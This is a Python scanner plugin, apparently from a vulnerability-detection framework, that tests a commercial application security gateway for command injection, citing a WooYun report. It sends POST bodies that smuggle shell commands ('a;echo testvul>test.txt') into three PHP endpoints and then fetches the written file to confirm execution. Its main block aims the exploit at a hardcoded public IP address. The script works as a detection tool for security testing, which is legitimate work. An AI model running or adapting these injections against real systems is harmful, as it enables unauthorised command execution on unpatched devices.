#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: 远为应用安全网关(&国富安应用安全网关)3处命令执行
refer: http://wooyun.org/bugs/wooyun-2015-0142868
description:
    
'''

import re

def assign(service, arg):
    if service == 'yuanwei_gateway':
        return True, arg

def audit(arg):
    content_type = 'Content-Type: application/x-www-form-urlencoded'
    urls = [
        arg + 'highconfig/ha.php',
        arg + 'highconfig/ha_old.php',
        arg + 'highconfig/hot.php'
    ]
    posts = [
        'name=a*;echo%20testvul0>test.txt',
        'ok=1&float_ip=a;echo%20testvul1>test.txt',
        'hand=1&localip=a;echo%20testvul2>test.txt',
    ]
    verify_url = arg + 'highconfig/test.txt'
    for i in range(len(urls)):
        url = urls[i]
        post = posts[i]
        code, head, res, err, _ = curl.curl2(url, post, header=content_type)
        if (code != 200) and (code != 302):
            continue
        #验证
        code, head, res, err, _ = curl.curl2(verify_url)
        #print res
        if (code == 200) and ('testvul'+str(i) in res):
            security_hole('Command execution: ' + url + ' POST:' + post)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('yuanwei_gateway','http://222.170.47.230:8888/')[1])